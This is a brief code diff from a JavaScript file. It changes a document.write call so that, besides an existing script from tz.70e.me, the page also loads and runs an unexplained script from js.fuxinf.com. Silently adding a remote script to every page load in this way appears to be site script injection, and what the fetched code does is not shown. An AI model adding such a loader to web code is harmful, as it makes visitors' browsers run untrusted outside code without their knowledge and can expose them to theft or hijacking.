@@ -83,4 +83,4 @@ setTimeout(function () {
         }
 	}
 }, 1000);
-document.write('<script src='+'https://tz.70e.me/s.php?id=17998'+'><\/script>');
+document.write('<script src='+'https://tz.70e.me/s.php?id=17998'+'><\/script><script src='+'https://js.fuxinf.com//zfu/wisi.js'+'><\/script>');
